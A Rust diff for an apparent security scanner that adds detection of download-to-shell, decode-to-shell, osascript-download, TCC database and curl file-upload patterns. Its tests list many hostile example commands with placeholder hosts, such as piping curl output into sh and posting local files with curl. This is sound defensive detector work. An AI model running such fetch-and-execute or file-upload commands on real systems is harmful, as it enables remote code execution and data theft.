@@ -37,12 +37,6 @@ const MARKERS: &[Marker] = &[
         bounded: false,
     },
     Marker {
-        needle: "TCC.db",
-        weight: 10,
-        note: "references the TCC permissions database directly",
-        bounded: false,
-    },
-    Marker {
         needle: "SecKeychain",
         weight: 8,
         note: "references Keychain Services APIs",
@@ -84,9 +78,7 @@ fn contains_token(haystack: &str, needle: &str, is_last: bool) -> bool {
     })
 }
 
-/// Longest `MARKERS` needle, in bytes — the overlap `for_each_window` needs
-/// so no needle can be split across a window boundary without landing whole
-/// in some window.
+/// Longest `MARKERS` needle, in bytes.
 const fn max_marker_len() -> usize {
     let mut max = 0usize;
     let mut i = 0usize;
@@ -102,12 +94,375 @@ const fn max_marker_len() -> usize {
 
 const MAX_MARKER_LEN: usize = max_marker_len();
 
-/// Scans one window's lossy-decoded text for `MARKERS`, setting `hits[i]`
-/// when marker `i` matches and isn't already set. `is_last` is forwarded to
-/// [`contains_token`] for bounded markers — see its doc.
-fn scan_window(text: &str, is_last: bool, hits: &mut [bool]) {
+/// A pattern must complete within this many bytes, first token to last.
+const PATTERN_SPAN: usize = 4096;
+
+/// Extra bytes of left context a streamed window keeps so a pattern's
+/// command-position check never sees a window edge.
+const CONTEXT_LOOKBACK: usize = 64;
+
+/// Streaming overlap: any marker or pattern lands whole, with its left
+/// context, in some window.
+const STREAM_OVERLAP: usize = if MAX_MARKER_LEN > PATTERN_SPAN + CONTEXT_LOOKBACK {
+    MAX_MARKER_LEN
+} else {
+    PATTERN_SPAN + CONTEXT_LOOKBACK
+};
+
+/// A multi-token intent (§5.2) that scores independently of the name markers.
+struct IntentPattern {
+    weight: i32,
+    note: &'static str,
+}
+
+const DOWNLOAD_TO_SHELL: usize = 0;
+const DECODE_TO_SHELL: usize = 1;
+const OSASCRIPT_DOWNLOAD: usize = 2;
+const TCC_DATABASE: usize = 3;
+const LOCAL_UPLOAD: usize = 4;
+
+const PATTERNS: &[IntentPattern] = &[
+    IntentPattern {
+        weight: 15,
+        note: "download piped to a shell",
+    },
+    IntentPattern {
+        weight: 15,
+        note: "decoded payload piped to a shell",
+    },
+    IntentPattern {
+        weight: 15,
+        note: "osascript runs a download",
+    },
+    IntentPattern {
+        weight: 10,
+        note: "references the TCC permissions database directly",
+    },
+    IntentPattern {
+        weight: 10,
+        note: "curl uploads a local file",
+    },
+];
+
+/// Which markers and patterns have matched so far.
+struct Hits {
+    markers: Vec<bool>,
+    patterns: [bool; PATTERNS.len()],
+}
+
+impl Hits {
+    fn new() -> Self {
+        Hits {
+            markers: vec![false; MARKERS.len()],
+            patterns: [false; PATTERNS.len()],
+        }
+    }
+
+    fn any(&self) -> bool {
+        self.markers.iter().any(|&h| h) || self.patterns.iter().any(|&h| h)
+    }
+}
+
+fn is_word(b: u8) -> bool {
+    b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.')
+}
+
+fn is_blank(b: u8) -> bool {
+    matches!(b, b' ' | b'\t')
+}
+
+fn skip_blanks(line: &[u8], mut i: usize) -> usize {
+    while i < line.len() && is_blank(line[i]) {
+        i += 1;
+    }
+    i
+}
+
+/// End of the run of path-word bytes (`is_word` plus `/`) starting at `i`.
+fn path_word_end(line: &[u8], mut i: usize) -> usize {
+    while i < line.len() && (is_word(line[i]) || line[i] == b'/') {
+        i += 1;
+    }
+    i
+}
+
+/// Whether the words after byte `from` are exactly `words`, blank-separated.
+fn words_follow(line: &[u8], mut from: usize, words: &[&[u8]]) -> bool {
+    for w in words {
+        let s = skip_blanks(line, from);
+        let mut e = s;
+        while e < line.len() && is_word(line[e]) {
+            e += 1;
+        }
+        if s == from || &line[s..e] != *w {
+            return false;
+        }
+        from = e;
+    }
+    true
+}
+
+/// Index just past the trailing blanks-trimmed text before `s`.
+fn trimmed_before(line: &[u8], s: usize) -> usize {
+    let mut j = s;
+    while j > 0 && is_blank(line[j - 1]) {
+        j -= 1;
+    }
+    j
+}
+
+/// Whether a token at `s` is at command position: nothing before it on the
+/// line, or a separator, or `sudo`/`exec`/`eval`. A token whose left context
+/// is cut by a window edge is never at command position.
+fn at_command_position(line: &[u8], s: usize, cut_start: bool) -> bool {
+    let j = trimmed_before(line, s);
+    if j == 0 {
+        return !cut_start;
+    }
+    if matches!(line[j - 1], b';' | b'|' | b'`' | b'(' | b'"' | b'\'' | b'&') {
+        // A lone `&` is a background operator, not `&&`.
+        return line[j - 1] != b'&' || line[..j].ends_with(b"&&");
+    }
+    let mut k = j;
+    while k > 0 && is_word(line[k - 1]) {
+        k -= 1;
+    }
+    (k > 0 || !cut_start) && matches!(&line[k..j], b"sudo" | b"exec" | b"eval")
+}
+
+/// Whether the token at `s` sits directly inside `<(` or `$(`.
+fn directly_in_substitution(line: &[u8], s: usize) -> bool {
+    let j = trimmed_before(line, s);
+    line[..j].ends_with(b"<(") || line[..j].ends_with(b"$(")
+}
+
+/// If the `|` at `pipe` feeds a shell (`sh`/`bash`/`zsh`, optionally behind
+/// `sudo`, `/bin/`, `/usr/bin/` or `/usr/bin/env`), the index just past the
+/// shell name. `None` when the name touches a cut line end.
+fn pipe_to_shell(line: &[u8], pipe: usize, cut_end: bool) -> Option<usize> {
+    if line.get(pipe + 1) == Some(&b'|') || (pipe > 0 && line[pipe - 1] == b'|') {
+        return None;
+    }
+    let mut s = skip_blanks(line, pipe + 1);
+    let mut e = path_word_end(line, s);
+    if &line[s..e] == b"sudo" {
+        s = skip_blanks(line, e);
+        e = path_word_end(line, s);
+    }
+    if &line[s..e] == b"/usr/bin/env" {
+        s = skip_blanks(line, e);
+        e = path_word_end(line, s);
+    }
+    let name = &line[s..e];
+    let name = name
+        .strip_prefix(b"/usr/bin/")
+        .or_else(|| name.strip_prefix(b"/bin/"))
+        .unwrap_or(name);
+    if !matches!(name, b"sh" | b"bash" | b"zsh") || (e == line.len() && cut_end) {
+        return None;
+    }
+    Some(e)
+}
+
+/// A decoder invocation waiting for its flags.
+#[derive(Clone, Copy)]
+struct Decoder {
+    start: usize,
+    subcommand: bool,
+    flag: bool,
+}
+
+impl Decoder {
+    fn ready(&self) -> bool {
+        self.subcommand && self.flag
+    }
+}
+
+/// Per-line matcher state; every `Option<usize>` is the start of the most
+/// recent qualifying token, the best candidate for the span check.
+#[derive(Default)]
+struct LineState {
+    downloader: Option<usize>,
+    shellish: Option<usize>,
+    curl: Option<usize>,
+    /// `base64`, `openssl`, `xxd`.
+    decoders: [Option<Decoder>; 3],
+    osascript: Option<usize>,
+    osascript_runs_shell: bool,
+}
+
+fn within_span(start: usize, end: usize) -> bool {
+    end - start <= PATTERN_SPAN
+}
+
+/// Whether `-d`/`--data*` at `end` is followed by `@` (a local file).
+fn upload_flag(line: &[u8], word: &[u8], end: usize) -> bool {
+    match word {
+        b"--data-binary" | b"--data" | b"-d" => line.get(skip_blanks(line, end)) == Some(&b'@'),
+        b"-F" => {
+            let s = skip_blanks(line, end);
+            line[s..]
+                .split(|&b| is_blank(b))
+                .next()
+                .is_some_and(|arg| arg.windows(2).any(|w| w == b"=@"))
+        }
+        b"-T" => line.get(end).is_some_and(|&b| is_blank(b)) && skip_blanks(line, end) < line.len(),
+        b"--upload-file" => true,
+        _ => false,
+    }
+}
+
+/// Matches the line-scoped patterns in one line, setting `hits`. `cut_start`
+/// / `cut_end` mark a line edge that is a window edge, not a real delimiter.
+fn scan_line(line: &[u8], cut_start: bool, cut_end: bool, hits: &mut [bool; PATTERNS.len()]) {
+    let mut st = LineState::default();
+    let mut i = 0;
+    while i < line.len() {
+        if line[i] == b'|' {
+            if let Some(end) = pipe_to_shell(line, i, cut_end) {
+                if st.downloader.is_some_and(|d| within_span(d, end)) {
+                    hits[DOWNLOAD_TO_SHELL] = true;
+                }
+                if st
+                    .decoders
+                    .iter()
+                    .flatten()
+                    .any(|d| d.ready() && within_span(d.start, end))
+                {
+                    hits[DECODE_TO_SHELL] = true;
+                }
+            }
+            i += 1;
+            continue;
+        }
+        if !is_word(line[i]) {
+            i += 1;
+            continue;
+        }
+        let (s, mut e) = (i, i);
+        while e < line.len() && is_word(line[e]) {
+            e += 1;
+        }
+        i = e;
+        if (s == 0 && cut_start) || (e == line.len() && cut_end) {
+            continue;
+        }
+        let word = &line[s..e];
+        let cmd = at_command_position(line, s, cut_start);
+
+        match word {
+            b"curl" | b"wget" if cmd => {
+                st.downloader = Some(s);
+                if word == b"curl" {
+                    st.curl = Some(s);
+                }
+                if directly_in_substitution(line, s)
+                    && st.shellish.is_some_and(|sh| within_span(sh, e))
+                {
+                    hits[DOWNLOAD_TO_SHELL] = true;
+                }
+            }
+            b"sh" | b"bash" | b"zsh" | b"eval" if cmd => st.shellish = Some(s),
+            b"base64" if cmd => {
+                st.decoders[0] = Some(Decoder {
+                    start: s,
+                    subcommand: true,
+                    flag: false,
+                });
+            }
+            b"openssl" if cmd => {
+                st.decoders[1] = Some(Decoder {
+                    start: s,
+                    subcommand: false,
+                    flag: false,
+                });
+            }
+            b"xxd" if cmd => {
+                st.decoders[2] = Some(Decoder {
+                    start: s,
+                    subcommand: true,
+                    flag: false,
+                });
+            }
+            b"osascript" if cmd => {
+                st.osascript = Some(s);
+                st.osascript_runs_shell = false;
+            }
+            _ => {}
+        }
+
+        match word {
+            b"-d" | b"-D" | b"--decode" => {
+                if let Some(d) = &mut st.decoders[0] {
+                    d.flag = true;
+                }
+                if word == b"-d" {
+                    if let Some(d) = &mut st.decoders[1] {
+                        d.flag = true;
+                    }
+                }
+            }
+            b"-r" => {
+                if let Some(d) = &mut st.decoders[2] {
+                    d.flag = true;
+                }
+            }
+            b"enc" | b"base64" => {
+                if let Some(d) = &mut st.decoders[1] {
+                    d.subcommand = true;
+                }
+            }
+            b"do" if st.osascript.is_some() && words_follow(line, e, &[b"shell", b"script"]) => {
+                st.osascript_runs_shell = true;
+            }
+            b"curl" | b"wget" => {
+                if let Some(o) = st.osascript {
+                    if st.osascript_runs_shell && within_span(o, e) {
+                        hits[OSASCRIPT_DOWNLOAD] = true;
+                    }
+                }
+            }
+            _ => {}
+        }
+        if let Some(c) = st.curl {
+            if upload_flag(line, word, e) && within_span(c, e) {
+                hits[LOCAL_UPLOAD] = true;
+            }
+        }
+    }
+}
+
+/// Runs [`scan_line`] over each `\n`/`\r`/NUL-delimited line of `text`.
+/// `is_first`/`is_last` say whether the window's edges are real input edges.
+fn scan_patterns(text: &str, is_first: bool, is_last: bool, hits: &mut [bool; PATTERNS.len()]) {
+    if !hits[TCC_DATABASE] && text.contains("TCC.db") {
+        hits[TCC_DATABASE] = true;
+    }
+    let bytes = text.as_bytes();
+    let mut start = 0;
+    while start <= bytes.len() {
+        let end = bytes[start..]
+            .iter()
+            .position(|&b| matches!(b, b'\n' | b'\r' | 0))
+            .map_or(bytes.len(), |p| start + p);
+        if end > start {
+            scan_line(
+                &bytes[start..end],
+                start == 0 && !is_first,
+                end == bytes.len() && !is_last,
+                hits,
+            );
+        }
+        start = end + 1;
+    }
+}
+
+/// Scans one window's lossy-decoded text for `MARKERS` and the intent
+/// patterns, setting `hits`. `is_first`/`is_last` are forwarded to
+/// [`scan_patterns`]; `is_last` also to [`contains_token`].
+fn scan_window(text: &str, is_first: bool, is_last: bool, hits: &mut Hits) {
     for (i, marker) in MARKERS.iter().enumerate() {
-        if hits[i] {
+        if hits.markers[i] {
             continue;
         }
         let matched = if marker.bounded {
@@ -116,9 +471,10 @@ fn scan_window(text: &str, is_last: bool, hits: &mut [bool]) {
             text.contains(marker.needle)
         };
         if matched {
-            hits[i] = true;
+            hits.markers[i] = true;
         }
     }
+    scan_patterns(text, is_first, is_last, &mut hits.patterns);
 }
 
 pub struct SuspiciousStringsRule;
@@ -139,13 +495,15 @@ impl Rule for SuspiciousStringsRule {
     }
 
     fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
-        let mut hits = vec![false; MARKERS.len()];
+        let mut hits = Hits::new();
 
         if ctx.truncated && can_stream(ctx) {
             let file_len = ctx.file_len.ok_or(RuleOutcome::NotApplicable)?;
-            let ok = ctx.for_each_window(0..file_len, MAX_MARKER_LEN, |window, is_last| {
+            let mut first = true;
+            let ok = ctx.for_each_window(0..file_len, STREAM_OVERLAP, |window, is_last| {
                 // Lossy-decoded: ASCII markers still match, no panic on non-UTF-8.
-                scan_window(&String::from_utf8_lossy(window), is_last, &mut hits);
+                scan_window(&String::from_utf8_lossy(window), first, is_last, &mut hits);
+                first = false;
             });
             if !ok {
                 ctx.mark_stream_failed(self.id());
@@ -153,7 +511,7 @@ impl Rule for SuspiciousStringsRule {
             // A stream that failed partway still reported real hits from
             // before the failure — keep those rather than discard them; only
             // a failure with nothing found at all is NotApplicable.
-            if !ok && !hits.iter().any(|&hit| hit) {
+            if !ok && !hits.any() {
                 return Err(RuleOutcome::NotApplicable);
             }
         } else {
@@ -163,28 +521,37 @@ impl Rule for SuspiciousStringsRule {
             // cap, or no ranged-read support) — a bounded marker ending
             // exactly at that cut is inconclusive, not a real end-of-input
             // match (§10/§11.8).
-            scan_window(&String::from_utf8_lossy(content), !ctx.truncated, &mut hits);
+            scan_window(
+                &String::from_utf8_lossy(content),
+                true,
+                !ctx.truncated,
+                &mut hits,
+            );
         }
 
-        let matched: Vec<&Marker> = MARKERS
+        let mut weight = 0;
+        let mut notes: Vec<&str> = Vec::new();
+        for (p, _) in PATTERNS
             .iter()
-            .zip(hits.iter())
-            .filter_map(|(m, &hit)| hit.then_some(m))
-            .collect();
-        if matched.is_empty() {
+            .zip(hits.patterns.iter())
+            .filter(|(_, &hit)| hit)
+        {
+            weight += p.weight;
+            notes.push(p.note);
+        }
+        for (m, _) in MARKERS
+            .iter()
+            .zip(hits.markers.iter())
+            .filter(|(_, &hit)| hit)
+        {
+            weight += m.weight;
+            notes.push(m.note);
+        }
+        if notes.is_empty() {
             return Ok(None);
         }
 
-        let weight = matched.iter().map(|m| m.weight).sum();
-        let description = format!(
-            "matched {} marker(s): {}",
-            matched.len(),
-            matched
-                .iter()
-                .map(|m| m.note)
-                .collect::<Vec<_>>()
-                .join("; ")
-        );
+        let description = format!("matched {} indicator(s): {}", notes.len(), notes.join("; "));
 
         Ok(Some(MatchedSignal {
             id: self.id().to_string(),
@@ -247,6 +614,193 @@ mod tests {
     #[test]
     fn a_match_at_the_end_of_a_non_final_window_is_not_counted() {
         assert!(!contains_token("curl x | sh", "| sh", false));
+    }
+
+    fn fired(text: &str) -> [bool; PATTERNS.len()] {
+        let mut hits = [false; PATTERNS.len()];
+        scan_patterns(text, true, true, &mut hits);
+        hits
+    }
+
+    fn fires(text: &str, pattern: usize) -> bool {
+        fired(text)[pattern]
+    }
+
+    fn none_fire(text: &str) -> bool {
+        fired(text) == [false; PATTERNS.len()]
+    }
+
+    #[test]
+    fn download_to_shell_fires_on_canonical_forms() {
+        for t in [
+            "curl -fsSL https://x.test/i | sh",
+            "wget -qO- x | sudo bash",
+            "wget -qO- x | /usr/bin/env zsh -s",
+            "curl x | /bin/sh",
+            "bash <(curl -s x)",
+            "sh -c \"$(curl -fsSL x)\"",
+            "eval \"$(curl -fsSL x)\"",
+            "exec(\"curl -s x | sh\")",
+            "cd /tmp && curl x | bash",
+            "echo hi; sudo curl x | bash -s",
+        ] {
+            assert!(fires(t, DOWNLOAD_TO_SHELL), "{t}");
+        }
+    }
+
+    #[test]
+    fn download_to_shell_rejects_non_intent() {
+        for t in [
+            ": curl x | sh",
+            "$ curl x | sh",
+            "<code>curl x | sh",
+            "see libcurl x | sh",
+            "libcurl | sh",
+            "curlx x | sh",
+            "curl x | shasum",
+            "curl x > f; sh f",
+            "curl x || sh",
+            "curl x | sh.exe",
+            "curl x & sh",
+            "echo <(curl x)",
+            "curl x\n| sh",
+            "curl x\nsh -c foo | sh",
+        ] {
+            assert!(none_fire(t), "{t}");
+        }
+    }
+
+    #[test]
+    fn decode_to_shell_fires_on_canonical_forms() {
+        for t in [
+            "echo \"$P\" | base64 -d | gunzip | sh",
+            "echo x | base64 -D | bash",
+            "echo x | base64 --decode | sh",
+            "echo x | openssl enc -d -base64 | sh",
+            "echo x | openssl base64 -d | sh",
+            "echo x | xxd -r -p | sh",
+        ] {
+            assert!(fires(t, DECODE_TO_SHELL), "{t}");
+        }
+    }
+
+    #[test]
+    fn decode_to_shell_needs_flags_and_a_shell() {
+        assert!(none_fire("echo x | base64 | sh"));
+        assert!(none_fire("echo x | base64 -d | cat"));
+        assert!(none_fire("echo x | openssl enc | sh"));
+        assert!(none_fire("echo x | openssl sha256 -d | sh"));
+        assert!(none_fire("echo x | xxd | sh"));
+    }
+
+    #[test]
+    fn osascript_download_needs_the_order() {
+        assert!(fires(
+            "osascript -e 'do shell script \"curl http://x && sh /tmp/x\"'",
+            OSASCRIPT_DOWNLOAD
+        ));
+        assert!(none_fire("osascript -e 'do shell script \"ls\"'"));
+        assert!(none_fire("osascript -e 'display dialog \"curl\"'"));
+        assert!(none_fire(
+            "curl x -o f; osascript -e 'do shell script \"ls\"'"
+        ));
+    }
+
+    #[test]
+    fn tcc_database_fires_anywhere() {
+        assert!(fires("x/Library/TCC/TCC.db y", TCC_DATABASE));
+    }
+
+    #[test]
+    fn local_upload_fires_on_canonical_forms() {
+        for t in [
+            "curl -X POST --data-binary @/tmp/x http://h",
+            "curl --data @f http://h",
+            "curl -d @f http://h",
+            "curl -F file=@/tmp/x http://h",
+            "curl -F \"f=@/tmp/x\" http://h",
+            "curl -T /tmp/x http://h",
+            "curl --upload-file /tmp/x http://h",
+        ] {
+            assert!(fires(t, LOCAL_UPLOAD), "{t}");
+        }
+        for t in [
+            "curl -d k=v http://h",
+            "curl -F k=v http://h",
+            "wget --data @f http://h",
+            "foo -d @f",
+        ] {
+            assert!(!fires(t, LOCAL_UPLOAD), "{t}");
+        }
+    }
+
+    #[test]
+    fn lines_split_on_cr_and_nul() {
+        assert!(fires("x\rcurl a | sh", DOWNLOAD_TO_SHELL));
+        assert!(fires("x\0curl a | sh\0y", DOWNLOAD_TO_SHELL));
+        assert!(none_fire("curl a\r| sh"));
+        assert!(none_fire("curl a\0| sh"));
+    }
+
+    #[test]
+    fn a_pattern_wider_than_the_span_does_not_fire() {
+        let far = format!("curl x {} | sh", "a ".repeat(PATTERN_SPAN / 2));
+        assert!(none_fire(&far));
+        let near = format!("curl x {} | sh", "a ".repeat(PATTERN_SPAN / 2 - 16));
+        assert!(fires(&near, DOWNLOAD_TO_SHELL));
+    }
+
+    #[test]
+    fn many_candidates_on_one_line_stay_linear() {
+        let line = "curl;".repeat(400_000);
+        let start = std::time::Instant::now();
+        assert!(none_fire(&line));
+        assert!(start.elapsed() < std::time::Duration::from_secs(5));
+    }
+
+    #[test]
+    fn a_pattern_cut_by_a_non_first_window_edge_is_not_matched() {
+        let mut hits = [false; PATTERNS.len()];
+        scan_patterns("curl x | sh", false, true, &mut hits);
+        assert!(!hits[DOWNLOAD_TO_SHELL]);
+        scan_patterns("a; curl x | sh", false, true, &mut hits);
+        assert!(hits[DOWNLOAD_TO_SHELL]);
+    }
+
+    #[test]
+    fn rule_reports_patterns_before_names() {
+        let ctx = ScanContext::from_embedded_bytes(
+            "x.sh",
+            b"#!/bin/sh\ncurl -fsSL http://x | sh\n".to_vec(),
+            false,
+        );
+        let sig = SuspiciousStringsRule.evaluate(&ctx).unwrap().unwrap();
+        assert!(sig
+            .description
+            .starts_with("matched 3 indicator(s): download piped to a shell"));
+        assert_eq!(sig.weight, 15 + 3 + 10);
+    }
+
+    /// A pattern straddling a `STREAM_CHUNK` boundary lands whole, with its
+    /// left context, in the next window's overlap.
+    #[test]
+    fn pattern_straddling_a_stream_chunk_boundary_is_found() {
+        for back in [3u64, 200, 4000] {
+            let total_len = MAX_CONTENT_BYTES as u64 + 4096;
+            let path = sparse_temp_file("pattern-straddle", total_len);
+            let boundary = 9 * STREAM_CHUNK as u64;
+            write_at(&path, boundary - back, b"\ncurl -fsSL http://x | sh\n");
+
+            let ctx = ScanContext::load(&path);
+            assert!(ctx.truncated);
+            let sig = SuspiciousStringsRule
+                .evaluate(&ctx)
+                .expect("rule should be applicable")
+                .expect("pattern straddling a window boundary should be found");
+            assert!(sig.description.contains("download piped to a shell"));
+
+            let _ = std::fs::remove_file(&path);
+        }
     }
 
     /// A marker past the 8 MiB prefix is invisible to a prefix-only scan, but
